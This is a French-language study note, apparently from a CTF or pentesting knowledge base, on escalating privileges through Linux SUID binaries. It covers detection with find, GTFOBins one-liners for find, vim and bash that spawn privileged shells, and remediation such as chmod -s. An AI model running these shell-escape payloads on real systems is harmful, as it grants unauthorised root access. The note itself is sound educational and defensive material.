---
technique: "SUID Binaries"
os: Linux
categorie: PrivEsc
tags: [technique, privesc, linux, suid]
rooms: []
---

# SUID Binaries

## Principe
> Un binaire avec le bit **SUID** (`-rwsr-xr-x`) s'exécute avec les droits de **son propriétaire** (souvent root), pas de l'utilisateur qui le lance. Si ce binaire permet d'exécuter des commandes ou de lire/écrire des fichiers, on hérite des droits root.

## Détection
```bash
find / -perm -4000 -type f 2>/dev/null
# Le 's' dans -rwsr-xr-x = SUID actif
ls -l /usr/bin/exemple
```

## Exploitation
1. Lister les SUID, repérer ceux **hors des classiques** (passwd, sudo, mount…).
2. Chercher le binaire sur **[GTFOBins](https://gtfobins.github.io/)** section `suid`.
3. Appliquer le payload fourni.

### Exemples GTFOBins
```bash
# find SUID
find . -exec /bin/sh -p \; -quit
# vim SUID (ou vim.basic)
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh","-c","reset; exec sh")'
# bash SUID
bash -p
```

## PATH hijack via SUID
Si un binaire SUID appelle une commande **sans chemin absolu** → voir PATH-Hijacking.

## Remédiation
- Retirer le bit SUID des binaires qui n'en ont pas besoin (`chmod -s`).
- Éviter les SUID maison qui appellent des commandes système.
